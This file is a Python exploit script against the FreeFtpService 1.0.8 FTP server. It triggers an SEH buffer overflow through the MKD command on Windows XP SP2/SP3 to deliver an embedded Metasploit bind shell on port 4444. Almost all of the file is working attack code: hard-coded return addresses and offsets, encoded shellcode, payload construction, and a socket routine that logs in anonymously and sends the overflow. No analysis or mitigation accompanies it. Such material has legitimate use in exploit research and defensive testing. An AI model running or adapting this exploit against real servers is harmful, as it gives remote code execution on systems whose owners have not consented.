#!/usr/bin/python
############################################################
# FreeFtpService 1.0.8
# EDBID: 
# Vulnerability: Overflow in mkd command
# author: 0x4E0x650x6F
############################################################
import socket
import sys, getopt
from struct import pack

TARGETS = { 
    "WinXpSp2"      : { # Windows xp sp2 0x7ffc0294 pop pop ret
        "ret"       : pack("<L", 0x7ffc0294),
        "offset"    : 1019,
        "size"      : 5000
    },
    "WinXpSp3"      : {  # Windows xp sp3 0x7ffc0294 pop pop ret
        "ret"       : pack("<L", 0x7ffc0294),
        "offset"    : 1019,
        "size"      : 5000
    }
}


def get_offsets(platform):
    # TARGETS[platform]
    if platform in TARGETS:
        return TARGETS[platform]
    else:
       return False

def get_shellcode():
    """
    Metasploit bind shell on port 4444
    payload size 725
    """
    shellcode = (
    "\x89\xe3\xda\xdb\xd9\x73\xf4\x5f\x57\x59\x49\x49\x49\x49\x43"
    "\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34"
    "\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41"
    "\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
    "\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a\x48\x4c\x42\x43\x30"
    "\x55\x50\x55\x50\x55\x30\x4d\x59\x5a\x45\x56\x51\x4f\x30\x42"
    "\x44\x4c\x4b\x46\x30\x56\x50\x4c\x4b\x46\x32\x44\x4c\x4c\x4b"
    "\x36\x32\x35\x44\x4c\x4b\x42\x52\x46\x48\x34\x4f\x58\x37\x50"
    "\x4a\x46\x46\x56\x51\x4b\x4f\x4e\x4c\x57\x4c\x55\x31\x33\x4c"
    "\x54\x42\x46\x4c\x51\x30\x39\x51\x48\x4f\x44\x4d\x53\x31\x59"
    "\x57\x4b\x52\x4b\x42\x46\x32\x56\x37\x4c\x4b\x31\x42\x44\x50"
    "\x4c\x4b\x50\x4a\x57\x4c\x4c\x4b\x30\x4c\x52\x31\x43\x48\x4a"
    "\x43\x50\x48\x33\x31\x58\x51\x50\x51\x4c\x4b\x31\x49\x47\x50"
    "\x33\x31\x38\x53\x4c\x4b\x50\x49\x32\x38\x4b\x53\x47\x4a\x37"
    "\x39\x4c\x4b\x30\x34\x4c\x4b\x53\x31\x59\x46\x36\x51\x4b\x4f"
    "\x4e\x4c\x4f\x31\x58\x4f\x54\x4d\x45\x51\x4f\x37\x36\x58\x4b"
    "\x50\x44\x35\x4b\x46\x55\x53\x43\x4d\x4b\x48\x47\x4b\x53\x4d"
    "\x46\x44\x44\x35\x4b\x54\x50\x58\x4c\x4b\x50\x58\x37\x54\x35"
    "\x51\x59\x43\x52\x46\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x50\x58"
    "\x45\x4c\x35\x51\x58\x53\x4c\x4b\x44\x44\x4c\x4b\x33\x31\x38"
    "\x50\x4b\x39\x50\x44\x31\x34\x37\x54\x51\x4b\x51\x4b\x45\x31"
    "\x56\x39\x50\x5a\x36\x31\x4b\x4f\x4d\x30\x31\x4f\x51\x4f\x30"
    "\x5a\x4c\x4b\x32\x32\x5a\x4b\x4c\x4d\x31\x4d\x53\x58\x46\x53"
    "\x46\x52\x33\x30\x53\x30\x43\x58\x34\x37\x54\x33\x47\x42\x51"
    "\x4f\x56\x34\x45\x38\x50\x4c\x34\x37\x31\x36\x54\x47\x4b\x4f"
    "\x48\x55\x58\x38\x5a\x30\x33\x31\x43\x30\x35\x50\x46\x49\x39"
    "\x54\x30\x54\x30\x50\x33\x58\x47\x59\x4b\x30\x32\x4b\x35\x50"
    "\x4b\x4f\x49\x45\x52\x4a\x45\x58\x31\x49\x30\x50\x4d\x32\x4b"
    "\x4d\x51\x50\x50\x50\x51\x50\x56\x30\x53\x58\x4a\x4a\x44\x4f"
    "\x59\x4f\x4d\x30\x4b\x4f\x59\x45\x4c\x57\x32\x48\x35\x52\x53"
    "\x30\x34\x51\x31\x4c\x4d\x59\x4d\x36\x43\x5a\x34\x50\x30\x56"
    "\x36\x37\x35\x38\x39\x52\x39\x4b\x30\x37\x53\x57\x4b\x4f\x39"
    "\x45\x31\x47\x55\x38\x58\x37\x4a\x49\x36\x58\x4b\x4f\x4b\x4f"
    "\x49\x45\x51\x47\x53\x58\x53\x44\x5a\x4c\x57\x4b\x4d\x31\x4b"
    "\x4f\x58\x55\x50\x57\x4c\x57\x45\x38\x54\x35\x32\x4e\x50\x4d"
    "\x45\x31\x4b\x4f\x59\x45\x43\x58\x52\x43\x32\x4d\x32\x44\x43"
    "\x30\x4d\x59\x5a\x43\x46\x37\x56\x37\x56\x37\x46\x51\x4b\x46"
    "\x53\x5a\x34\x52\x31\x49\x50\x56\x4b\x52\x4b\x4d\x45\x36\x59"
    "\x57\x57\x34\x46\x44\x57\x4c\x43\x31\x43\x31\x4c\x4d\x57\x34"
    "\x36\x44\x42\x30\x48\x46\x53\x30\x50\x44\x30\x54\x56\x30\x31"
    "\x46\x51\x46\x30\x56\x50\x46\x31\x46\x30\x4e\x51\x46\x31\x46"
    "\x51\x43\x51\x46\x52\x48\x54\x39\x48\x4c\x57\x4f\x4b\x36\x4b"
    "\x4f\x39\x45\x4b\x39\x4d\x30\x50\x4e\x46\x36\x51\x56\x4b\x4f"
    "\x56\x50\x53\x58\x34\x48\x4d\x57\x55\x4d\x43\x50\x4b\x4f\x38"
    "\x55\x4f\x4b\x4d\x30\x55\x4d\x46\x4a\x45\x5a\x35\x38\x49\x36"
    "\x4d\x45\x4f\x4d\x4d\x4d\x4b\x4f\x48\x55\x47\x4c\x45\x56\x53"
    "\x4c\x35\x5a\x4b\x30\x4b\x4b\x4d\x30\x54\x35\x44\x45\x4f\x4b"
    "\x50\x47\x32\x33\x43\x42\x42\x4f\x33\x5a\x45\x50\x30\x53\x4b"
    "\x4f\x48\x55\x41\x41")
    return [
        "\x90\xEB\x08\x90", # jump short 
        shellcode
    ]


def exploit(ip, port, payload, user = "Anonymous", pwd = "Anonymous"):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect=s.connect((ip,port))
    s.recv(1024)
    s.send('USER '+ user +'\r\n')
    s.recv(1024)
    s.send('PASS '+ pwd +'\r\n')
    s.recv(1024)
    print "Payload size: %s" % (len(payload))
    s.send('MKD ' + "".join(payload) + '\r\n')
    print "Sent"
    s.recv(1024)
    s.send('QUIT\r\n')
    s.close()

def usage():
    print 'exploit.py -h <ip> -p <port> -u <username> -w <password> -o <os>'
    print 'Targets: %s' % TARGETS.keys()
    sys.exit(2)


def main(host, port, platform, user, pwd):
    # Prepare the offsets
    target      = get_offsets(platform)
    ret         = target['ret']
    offset      = target['offset']
    seh_offset  = offset + 4
    buf_size    = target['size']

    # prepare payload
    shellcode   = get_shellcode()
    jmp_short   = shellcode[0]
    shell       = shellcode[1]
    number_nops = 10

    # build the payload template
    payload     = list("A" * buf_size)
    payload[offset: (offset + len(jmp_short))]  = jmp_short
    payload[seh_offset: (seh_offset + len(ret))]  = ret
    payload[(seh_offset + len(ret)): (seh_offset + len(ret) + number_nops)]  = "\x90" * number_nops
    payload[(seh_offset + len(ret) + number_nops): (seh_offset + len(ret) + number_nops + len(shell))]  = shell
    
    exploit(host, port, payload, user, pwd)

if __name__ == '__main__':
    host = None
    port = 21
    username = 'Anonymous'
    password = 'Anonymous'
    os = 'WinXpSp3'
    
    try:
        opts, args = getopt.getopt(sys.argv[1:],"h:p:u:w:o:")
    except getopt.GetoptError:
        usage()
    
    for opt, arg in opts:
        if opt == '-h':
            host = arg
        elif opt in ("-p"):
            port = int(arg)
        elif opt in ("-u"):
            username = arg
        elif opt in ("-w"):
            password = arg
        elif opt in ("-o"):
            os = arg
        else:
            usage()

    if len(sys.argv) != 1:
        main(host, port, os, username, password)
    else:    
        usage()
    
   
